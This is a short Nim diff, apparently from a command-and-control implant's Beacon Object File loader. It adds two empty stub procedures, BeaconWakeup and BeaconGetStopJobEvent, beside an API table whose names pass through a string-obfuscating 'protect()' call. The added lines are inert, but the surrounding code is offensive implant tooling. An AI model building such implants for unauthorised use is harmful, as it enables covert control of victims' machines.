@@ -407,6 +407,14 @@ proc BeaconRemoveValue(key: PCHAR): BOOL {.stdcall.} =
     except:
         return FALSE
 
+proc BeaconWakeup() {.stdcall.} = 
+    # Set wakeup event
+    discard 
+
+proc BeaconGetStopJobEvent(): HANDLE {.stdcall.} = 
+    # Return stop event
+    discard
+
 var beaconApiAddresses*: array[32, tuple[name: string, address: PVOID]] = [
     (protect("BeaconDataParse"), BeaconDataParse),
     (protect("BeaconDataPtr"), BeaconDataPtr),
